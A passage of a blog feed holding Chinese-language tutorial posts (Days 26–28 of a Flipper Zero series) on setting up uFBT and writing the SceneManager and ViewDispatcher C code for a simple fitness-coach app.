    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://artprojectsforkids.org/wp-content/uploads/2024/04/Draw-a-dolphin-web.jpg"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://artprojectsforkids.org/how-to-draw-a-dolphin/" >https://artprojectsforkids.org/how-to-draw-a-dolphin/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="開發倒數-48-小時"><a href="#開發倒數-48-小時" class="headerlink" title="開發倒數 48 小時"></a>開發倒數 48 小時</h2><h3 id="SceneManager-and-ViewDispatcher"><a href="#SceneManager-and-ViewDispatcher" class="headerlink" title="SceneManager and ViewDispatcher"></a>SceneManager and ViewDispatcher</h3><p>我們要繼續提到 SceneManager 透過一系列的 <code>scene_manager_*</code> 開頭的函式來管理應用程式中的所有場景細節。主要是確保當進入場景、離開場景或接收到新事件時，相關的處理函式會被正確的呼叫。<br>另一個是 ViewDispatcher 是使用許多 <code>view_dispatcher_*</code> 的函式來管理 views。這些函式會在 SceneManager 中被呼叫。總之，ViewDispatcher 是負責處理場景中 Views 的顯示和管理。<br>當我們在定義應用程式場景時，應提供所有場景處理函式作為一個 SceneManagerHandlers 結構傳給 <code>scene_manager_alloc</code> 函式。例如說作者這邊的場景會用數字做為索引，同時為了方便追蹤這些場景，通常我們會定義一個 enum 類型來表示場景的索引，像是：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    TestAppScene_MainMenu,      <span class="comment">// 主選單場景</span></span><br><span class="line">    TestAppScene_FirstPopup,    <span class="comment">// 第一個彈出視窗場景</span></span><br><span class="line">    TestAppScene_SecondPopup,   <span class="comment">// 第二個彈出視窗場景</span></span><br><span class="line">    TestAppScene_count          <span class="comment">// 場景計數，方便後續擴展</span></span><br><span class="line">&#125; TestAppScene;</span><br></pre></td></tr></table></figure></div><p>像是這邊的 count 只要放在枚舉的最後一項，之後增加或是修改場景數量的時候都可以輕鬆算出場景的總數。</p><p>而視圖是可以重複使用的，因此應用程式中可能場景數量會比視圖更多。換句話說，我們有可能一個視圖對應多個場景：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    TestAppView_Menu,   <span class="comment">// 菜單視圖</span></span><br><span class="line">    TestAppView_Popup   <span class="comment">// 彈出視圖</span></span><br><span class="line">&#125; TestAppScene;</span><br></pre></td></tr></table></figure></div><p>這樣也提高了資源利用率。</p><h3 id="初始化應用程式"><a href="#初始化應用程式" class="headerlink" title="初始化應用程式"></a>初始化應用程式</h3><p>首先我們會在 <code>test_app_init</code> 函式裡面初始化 scene manager 以及 view dispatcher：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TestApp* app = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TestApp));</span><br><span class="line">test_app_scene_manager_init(app);</span><br><span class="line">test_app_view_dispatcher_init(app);</span><br></pre></td></tr></table></figure></div><h3 id="設定-Scene-Manager"><a href="#設定-Scene-Manager" class="headerlink" title="設定 Scene Manager"></a>設定 Scene Manager</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;scene_manager = scene_manager_alloc(&amp;test_app_scene_event_handlers, app);</span><br></pre></td></tr></table></figure></div><p>我們為 SceneManager 分配記憶體。<br>其中這邊的第二個參數是 context，當場景處理方法被調用時，會回傳這個 context，第一個參數是 <code>SceneManagerHandlers* test_app_scene_event_handlers</code> 已經提前定義好並包含 <code>on_enter</code>、<code>on_exit</code>、<code>on_event</code> 處理函式集合。</p><h3 id="處理函式集合"><a href="#處理函式集合" class="headerlink" title="處理函式集合"></a>處理函式集合</h3><p><code>on_enter_handlers</code>：當進入某個場景時會調用這個處理函式集合，它包含了所有場景的進入處理邏輯。這些函式與定義的 enum 順序一致。例如，進入主選單或彈出視窗時會調用對應的進入函數。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*<span class="type">const</span> test_app_scene_on_enter_handlers[])(<span class="type">void</span>*) = &#123;</span><br><span class="line">    test_app_scene_on_enter_main_menu,</span><br><span class="line">    test_app_scene_on_enter_popup_one,</span><br><span class="line">    test_app_scene_on_enter_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>on_event_handlers</code>：當某個場景處於活動狀態時，並且收到了事件（如使用者操作），會調用這個事件處理函式集合。每個場景有其專屬的事件處理邏輯，也是與 enum 順序一致。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> (*<span class="type">const</span> test_app_scene_on_event_handlers[])(<span class="type">void</span>*, SceneManagerEvent) = &#123;</span><br><span class="line">    test_app_scene_on_event_main_menu,</span><br><span class="line">    test_app_scene_on_event_popup_one,</span><br><span class="line">    test_app_scene_on_event_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>on_exit_handlers</code>：當離開某個場景時，會調用這個處理函式集合。這些函式負責處理場景退出時的清理或其他工作，同樣是與 enum 順序保持一致。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*<span class="type">const</span> test_app_scene_on_exit_handlers[])(<span class="type">void</span>*) = &#123;</span><br><span class="line">    test_app_scene_on_exit_main_menu,</span><br><span class="line">    test_app_scene_on_exit_popup_one,</span><br><span class="line">    test_app_scene_on_exit_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>test_app_scene_event_handlers</code>：這是所有場景處理器的集合，包含 <code>on_enter</code>、<code>on_event</code> 和 <code>on_exit</code> 的處理函數。這樣的結構可以確保每個場景的進入、事件處理和退出邏輯都能正確運行。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> SceneManagerHandlers test_app_scene_event_handlers = &#123;</span><br><span class="line">    .on_enter_handlers = test_app_scene_on_enter_handlers,   <span class="comment">// 進入處理函式集合</span></span><br><span class="line">    .on_event_handlers = test_app_scene_on_event_handlers,   <span class="comment">// 事件處理函式集合</span></span><br><span class="line">    .on_exit_handlers = test_app_scene_on_exit_handlers,     <span class="comment">// 退出處理函式集合</span></span><br><span class="line">    .scene_num = TestAppScene_count&#125;;                       <span class="comment">// 場景數量</span></span><br></pre></td></tr></table></figure></div><h2 id="設定-View-Dispatcher"><a href="#設定-View-Dispatcher" class="headerlink" title="設定 View Dispatcher"></a>設定 View Dispatcher</h2><p><code>test_app_view_dispatcher_init</code> 函式負責初始化視圖分發器，這部分稍微複雜一點。具體的步驟如下：</p><ol><li>首先我們要先分配一個視圖分發器，用來管理應用程式中的不同視圖：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;view_dispatcher = view_dispatcher_alloc();</span><br></pre></td></tr></table></figure></div></li><li>接著，我們需要啟用隊列功能，讓視圖分發器能夠依序處理事件。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view_dispatcher_enable_queue(app-&gt;view_dispatcher);</span><br></pre></td></tr></table></figure></div></li><li>然後我們需要為應用程式中的各個視圖分配記憶體，這裡我們分別為菜單和彈出視窗進行分配：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;menu = menu_alloc();</span><br><span class="line">app-&gt;popup = popup_alloc();</span><br></pre></td></tr></table></figure></div></li><li>接著我們將事件從視圖傳遞到場景管理器，因為視圖本身會處理事件和導航功能，但我們希望這些事件能夠傳遞到場景管理器，使得目前處於活躍狀態的場景能夠接收到並處理這些事件。因此我們需要設置事件回調函式來將事件傳遞到場景管理器。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 設置回調函式，將事件從視圖傳遞到場景管理器</span></span><br><span class="line">view_dispatcher_set_event_callback_context(app-&gt;view_dispatcher, app);</span><br><span class="line">view_dispatcher_set_custom_event_callback(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    test_app_scene_manager_custom_event_callback);</span><br><span class="line">view_dispatcher_set_navigation_event_callback(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    test_app_scene_manager_navigation_event_callback);</span><br></pre></td></tr></table></figure></div></li><li>最後，我們需要將視圖註冊到視圖分發器，並且將它們與各自的列舉值進行對應。這樣，當我們需要切換到特定視圖時，系統能夠正確處理視圖之間的切換。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 將視圖添加到分發器，並根據它們的列舉值進行索引</span></span><br><span class="line">view_dispatcher_add_view(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    TestAppView_Menu,</span><br><span class="line">    menu_get_view(app-&gt;menu));</span><br><span class="line"></span><br><span class="line">view_dispatcher_add_view(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    TestAppView_Popup,</span><br><span class="line">    popup_get_view(app-&gt;popup));</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天就先到這邊，預計明天走完教學，後天做出自已的 app。<br>各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day27 - 死線逼近！強制切回生存模式的 72 小時開發極限挑戰！</title>
    <link href="https://kazma.tw/2024/10/11/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day27/"/>
    <id>https://kazma.tw/2024/10/11/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day27/</id>
    <published>2024-10-11T13:53:01.219Z</published>
    <updated>2024-10-27T09:34:38.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackster.imgix.net/uploads/attachments/1374483/image_sveSs9T3Mx.png?auto=compress,format&w=830&h=466.875&fit=min&dpr=2"                      alt="dolphin"                ><br>圖片來源：<a class="link"   href="https://www.hackster.io/news/the-flipper-zero-pocket-cyberdolphin-multi-tool-device-for-geeks-enters-mass-production-8523b2d96d96" >https://www.hackster.io/news/the-flipper-zero-pocket-cyberdolphin-multi-tool-device-for-geeks-enters-mass-production-8523b2d96d96 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="接著開發"><a href="#接著開發" class="headerlink" title="接著開發"></a>接著開發</h2><p>首先我們用先用 <code>ufbt</code> 來創造開發環境：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt create APPID=test_app                                                                                       ─╯</span><br><span class="line">Checking <span class="keyword">for</span> tar..yes</span><br><span class="line">Checking <span class="keyword">if</span> downloaded toolchain tgz exists..no</span><br><span class="line">Checking curl..yes</span><br><span class="line">Downloading toolchain:</span><br><span class="line"><span class="comment">################################################################################################################ 100.0%</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Removing old toolchain..done</span><br><span class="line">Unpacking toolchain to <span class="string">&#x27;/Users/kingkazma/.ufbt/toolchain&#x27;</span>:</span><br><span class="line"><span class="comment">##################################################################### 100.0%</span></span><br><span class="line">linking toolchain to <span class="string">&#x27;current&#x27;</span>..<span class="keyword">done</span></span><br><span class="line">Cleaning up..done</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fbt: warning: App folder &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach<span class="string">&#x27;: missing manifest (application.fam)</span></span><br><span class="line"><span class="string">LoadAppManifest, line 130, in file &quot;/Users/kingkazma/.ufbt/current/scripts/fbt_tools/fbt_apps.py&quot;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/test_app.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/test_app.png</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/application.fam<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Mkdir(&quot;/Users/kingkazma/Dolzma_Power_Coach/images&quot;)</span></span><br><span class="line"><span class="string">Touch(&quot;/Users/kingkazma/Dolzma_Power_Coach/images/.gitkeep&quot;)</span></span><br><span class="line"><span class="string">Copy(&quot;/Users/kingkazma/Dolzma_Power_Coach/.github&quot;, &quot;project_template/app_template/.github&quot;)</span></span><br></pre></td></tr></table></figure></div><p>然後我們就可以看到當前資料夾下有四個東西：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">ls</span>                                                                                                               ─╯</span><br><span class="line">application.fam images          test_app.c      test_app.png</span><br></pre></td></tr></table></figure></div><p>分別代表：</p><ul><li>application.fam<ul><li>app menifest, 關於 app 的細節</li></ul></li><li>images&#x2F;<ul><li>放圖片的資料夾</li></ul></li><li>test_app.c<ul><li>application 的原始碼</li></ul></li><li>test_app.png<ul><li>放 10x10 1-bit png icon 的地方</li></ul></li></ul><p>當我們要測試 app 的時候可以透過 <code>ufbt</code> 來編譯成一個 test_app.fap 位置在 dist&#x2F; 下面，我們可以把它上傳到 Flipper Zero SD card Examples&#x2F; 資料夾下面。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt                                                                                                             ─╯</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">ICONS/Users/kingkazma/.ufbt/build/test_app/test_app_icons.c</span></span><br><span class="line"><span class="string">CDB/Users/kingkazma/Dolzma_Power_Coach/.vscode/compile_commands.json</span></span><br><span class="line"><span class="string">CC/Users/kingkazma/Dolzma_Power_Coach/test_app.c</span></span><br><span class="line"><span class="string">CC/Users/kingkazma/.ufbt/build/test_app/test_app_icons.c</span></span><br><span class="line"><span class="string">LINK/Users/kingkazma/.ufbt/build/test_app_d.elf</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/dist/debug/test_app_d.elf</span></span><br><span class="line"><span class="string">APPMETA/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">FAP/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">FASTFAP/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/dist/test_app.fap</span></span><br><span class="line"><span class="string">APPCHK/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">Target: 7, API: 76.0</span></span><br></pre></td></tr></table></figure></div><h2 id="VScode-integration"><a href="#VScode-integration" class="headerlink" title="VScode integration"></a>VScode integration</h2><p>VScode 有一些好用的整合功能可以透過 ufbt 來下載讓我們開發更方便。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt vscode_dist                                                                                                 ─╯</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/c_cpp_properties.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/extensions.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/launch.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/settings.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/tasks.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.clang-format</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.clangd</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.editorconfig</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.gitignore</span></span><br><span class="line"><span class="string">CDB/Users/kingkazma/Dolzma_Power_Coach/.vscode/compile_commands.json</span></span><br></pre></td></tr></table></figure></div><p>現在 VScode 就可以我們前面載的 SDK 幫助我們檢查語法跟 highlighting，以及一些快捷鍵：</p><ul><li><code>Shift + Command + B</code> 可以顯示 build menu<ul><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/vscode_build.png"                      alt="build"                ></li></ul></li><li><code>Shift + Command + D</code> 可以顯示 debugging menu<ul><li>按了沒反應w</li></ul></li></ul><h2 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h2><p>在 instantiator.dev 的第二篇教學中的 UI 會有三個 scenes：</p><ul><li>main menu</li><li>popup1</li><li>popup2</li></ul><p>Flipper Zero 提供很多方式來構建應用程式的介面，其中最簡單的方式就是創建並註冊一個 <code>ViewPort</code>，然後註冊一個 redrawing function，當每次調用 <code>view_port_update</code> 的時候，這個函式就會執行。<br>雖然上面這種方式比較簡單，但是這沒辦法利用韌體中的所有元件，我們也需要自己設計介面，但這種方法在社群中還是蠻受歡迎的，特別是開發簡單的應用程式的時候。<br>這次的教學裡面作者會提到的是另一種開發 UI 的方式，支持簡化和管理更複雜的 UI 結構，而且利用到 Flipper 韌體中的各種 UI 元件。</p><h2 id="Scene-View"><a href="#Scene-View" class="headerlink" title="Scene &amp; View"></a>Scene &amp; View</h2><p>使用者介面可以分解成 View，每個 View 都是一個視覺元件，例如菜單、彈出視窗、文件瀏覽器、文本輸入等。<br>這次的教學裡會探討更多 Menu 跟 Popup 元件。<br>而 Scene 是 View 的上一層 abstraction，允許我們定義一組場景處理函數，這些函數會在我們載入場景的時候呈現視圖、退出時銷毀它。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>對今天的內容還是很少，緩慢推進中XD<br>我們會先透過 instantiator.dev 的教學文章熟悉開發 Flipper app 的流程，接著會開發之前說的健身海豚教練。<br>那就先醬，各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >https://instantiator.dev/post/flipper-zero-app-tutorial-01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/instantiator/flipper-zero-tutorial-app" >https://github.com/instantiator/flipper-zero-tutorial-app <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day26 - 一鍵切換創造模式：從零開始打造專屬我的健身海豚教練</title>
    <link href="https://kazma.tw/2024/10/10/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day26/"/>
    <id>https://kazma.tw/2024/10/10/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day26/</id>
    <published>2024-10-10T14:08:46.405Z</published>
    <updated>2024-10-27T09:34:10.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://masterpiecer-images.s3.yandex.net/5fe3895bc157c4f:upscaled"                      alt="strong"                ><br>圖片來源：<a class="link"   href="https://shedevrum.ai/en/post/5fe3895bc157c4f/" >https://shedevrum.ai/en/post/5fe3895bc157c4f/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嗨我是 Kazma。<br>我們在這次的鐵人賽挑戰中，涵蓋了攻擊到防守，也有包含內建應用程式到社群插件，所以是時候來動手寫一個自己生活中會用到的 App 了。<br>那關於要寫什麼 App 這幾天其實閃過很多念頭，最後決定做一個「健身海豚教練」，會想到這個主題主要是因為其實現在的手機很強大了，而且 Flipper 的內建功能和插件也算是很完整，所以如果要做一個相對實用的應用程式，就希望能盡量發揮不用手機的優勢，就在今天健身時意識到自己組間休常常滑手機到超時，或是課表不夠固定，或甚至會忘記做到第幾組。有了「健身海豚教練」我們就可以把課表包括重量和組數以及動作和組間休息時間都事先設定好，讓訓練可以更完整。而且也可以避免自己在組間休時拿手機出來滑導致超時，之後健身帶一個 Flipper 就可以了！</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="關於開發一個-Flipper-App"><a href="#關於開發一個-Flipper-App" class="headerlink" title="關於開發一個 Flipper App"></a>關於開發一個 Flipper App</h2><p>首先我在網路上看到許多文章和影片都有提到這塊，所以我會把參考資料都附在最後，有興趣的各位可以去看看。<br>先從 instantiator.dev 的 <a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >Building an app for Flipper Zero, part 1: Getting started tutorial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 開始，我們接下來有可能會用到作者使用到的工具，先介紹一下：</p><ul><li><a class="link"   href="https://github.com/flipperdevices/flipperzero-ufbt" >uFBT(micro Flipper Build Tool) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 是一個跨平台的 Flipper Zero 開發工具，是 Flipper Build Tool 的輕量版</li><li><a class="link"   href="https://code.visualstudio.com/" >Visual Studio Code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 一個很強大的編輯器和 IDE</li><li><a class="link"   href="https://www.pinta-project.com/" >Pinta <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 免費開源的繪圖工具</li></ul><h2 id="開搞"><a href="#開搞" class="headerlink" title="開搞"></a>開搞</h2><p>首先我們先創個資料夾之後進去：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> Dolzma_Power_Coach</span><br><span class="line"><span class="built_in">cd</span> Dolzma_Power_Coach</span><br></pre></td></tr></table></figure></div><p>接著我們要透過 uFBT 去下載最新的 Software Development Kit (SDK)，我們載的 SDK 是符合 dev 版本的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt update 